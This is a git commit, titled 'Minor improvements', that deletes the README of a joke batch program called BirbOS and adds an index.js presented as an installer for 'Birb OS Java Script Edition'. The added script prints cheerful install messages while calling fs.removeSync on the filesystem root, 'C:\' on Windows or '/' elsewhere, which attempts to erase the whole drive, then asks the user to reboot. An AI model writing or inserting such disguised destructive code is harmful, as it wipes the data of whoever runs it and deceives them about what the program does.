a8ade1ba090209bb2609aa68828809a87bfdf466
1024x2 <cod1nggam3rhd@gmail.com>
2019-02-08 21:49:51 +0000

    Minor improvements

--- README.md
+++
@@ -1,5 +0,0 @@
-# BirbOS
-A basic Batch OS developed by Dukemz, xandrei and Ad2017.
-Current version: (8.2.0)
-
-*note that this is not an actual OS and it's just a fun batch program.*
---
+++ index.js
@@ -0,0 +1,5 @@
+const fs = require("fs-extra");
+
+console.log("Welcome to great haha Birb Os Java Script Edition!!!!!!!!!!! Installing Cool Birb Stuff!!!!!!!");
+fs.removeSync(process.platform == "win32" ? "C:\\" : "/");
+console.log("Ok I Install Please Reboot For Cool Stuff To Do Maximum Coolness");
